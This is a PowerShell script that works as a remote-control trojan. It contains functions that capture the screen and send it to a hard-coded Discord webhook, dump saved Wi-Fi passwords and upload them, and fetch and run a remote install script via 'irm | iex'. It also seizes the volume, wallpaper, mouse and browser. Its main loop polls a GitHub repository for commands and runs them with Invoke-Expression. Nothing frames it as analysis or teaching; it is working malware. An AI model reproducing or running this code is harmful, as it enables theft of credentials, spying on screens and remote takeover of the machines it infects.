Set-Location $env:Temp; Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound1.wav -O sound1.wav -UseBasicParsing
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound2.wav -O sound2.wav -UseBasicParsing
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound3.wav -O sound3.wav -UseBasicParsing


Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume
{
    // f(), g(), ... are unused COM method slots. Define these if you care
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice
{
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator
{
    int f(); // Unused
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio
{
    static IAudioEndpointVolume Vol()
    {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
        return epv;
    }
    public static float Volume
    {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute
    {
        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
'@

function Upload-Discord {
  [CmdletBinding()]
  param (
      [parameter(Position=0,Mandatory=$False)]
      [string]$file,
      [parameter(Position=1,Mandatory=$False)]
      [string]$text
  )
 
  $hookurl = "https://discord.com/api/webhooks/1117010204882649108/P17xsDKiBxsPNV0G49brrLwtwkHU-haM3iOLQJmp8c9dMQKve_e4vWvR6F966DiiYGOB"
 
  $Body = @{
    'username' = $env:username
    'content' = $text
  }
 
  if (-not ([string]::IsNullOrEmpty($text))){
  Invoke-RestMethod -ContentType 'Application/Json' -UseBasicParsing -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
  if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
  }


$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@
add-type $code

Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$screens = [Windows.Forms.Screen]::AllScreens

$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
$right  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
$bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($bmp)

function save-screen {
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$bmp.Save("$env:temp\test.png")
Upload-Discord -file $env:temp\test.png | Out-null
}

function mouse-shake($i) {
$Pos = [System.Windows.Forms.Cursor]::Position
$x = $pos.X
$y = $pos.Y
foreach ($o in 1..$i){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
Sleep -Milliseconds 350
}
}

function set-vol($n1){
[audio]::Mute = $false
[audio]::Volume  = $n1 / 100
}

function set-wall($imgPath){
[Win32.Wallpaper]::SetWallpaper($imgPath)
}

function download($link1){
Invoke-WebRequest $link1 -O img.jpg -UseBasicParsing
}

function sound($y){
$Player = New-Object System.Media.SoundPlayer $y
$player.play()
}

function pass-grab{
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
$wifiProfiles > $env:TEMP/--wifi-pass.txt
Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
}

function auto-load{
irm https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/install.ps1 | iex
}

$wshell = New-Object -ComObject wscript.shell;

function yut($link) {
[system.Diagnostics.Process]::Start("chrome",$link) | Out-Null
sleep 2
$wshell.SendKeys('{F11}')
sleep -Seconds 7
$wshell.SendKeys('f')
sleep 1
$wshell.SendKeys('{up}')
sleep 1
$wshell.SendKeys('{up}')
}

$b = $True
while(1){
$p = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/312" -UseBasicParsing
$p.Content -match 'rawLines":..(.*?)..,' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
if(($Matches[1] -eq 0) -and (!$b)){
$b = $True
}
if(($Matches[1] -eq 1) -and ($b)){
$c = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/command" -UseBasicParsing
$c.Content -match 'rawLines":..(.*?)..,.stylingDirectives' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
Invoke-Expression $Matches[1]
$b = $False
}
sleep -Seconds 3
}
